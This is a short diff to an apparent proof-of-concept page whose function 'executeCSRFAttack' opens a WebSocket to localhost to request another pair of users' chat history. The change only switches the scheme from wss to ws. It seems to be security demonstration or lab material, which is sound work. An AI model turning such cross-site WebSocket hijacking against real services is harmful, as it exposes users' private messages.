@@ -54,7 +54,7 @@
         function executeCSRFAttack() {
             log('Starting attack...');
             
-            const ws = new WebSocket('wss://localhost');
+            const ws = new WebSocket('ws://localhost');
             
             ws.onopen = function() {
                 log('Connected! Requesting Bob-Charlie history...');
